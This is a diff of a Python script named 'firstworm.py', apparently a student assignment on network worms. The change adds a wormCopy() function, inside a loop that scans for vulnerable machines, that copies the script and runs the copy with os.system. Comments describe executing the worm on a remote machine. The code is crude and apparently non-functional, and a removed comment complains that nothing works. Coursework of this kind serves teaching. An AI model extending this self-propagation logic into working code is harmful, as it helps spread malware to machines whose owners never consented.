@@ -77,16 +77,17 @@ while True: #infinite loop, instant start
                         except:
                             pass
                 find_vulnerable_machines() 
-                # copy this worm program to remote machine
 
-#make a new file, 
-with open('firstworm.py', 'r') as source:            
-    with open('firstworm_copy.py', 'a') as dest:
-        dest.writelines(source) # inject worm
-
-            # execute worm on remote machine
-
-#i think, open terminal, python3 firstworm.py
+                def wormCopy():
+                        #make a new file, 
+                        with open('firstworm.py', 'r') as source:            
+                            with open('firstworm_copy.py', 'a') as dest:
+                                dest.writelines(source) # inject worm
+                                    # execute worm on remote machine
+                        os.system('python3 firstworm_copy.py')
+                        #open terminal, python3 firstworm.py
+                                    
+                wormCopy()
                 
                 # disconnect
                 client.close()
@@ -95,7 +96,7 @@ with open('firstworm.py', 'r') as source:
 
 
 if __name__ == "__main__":
-    
+    find_vulnerable_machines() 
+    wormCopy()
 
-    #TODO: question2 part 3. 
-    # sob sob im seething none of our code works at fucking all not even the TA's literal own example code 
+   
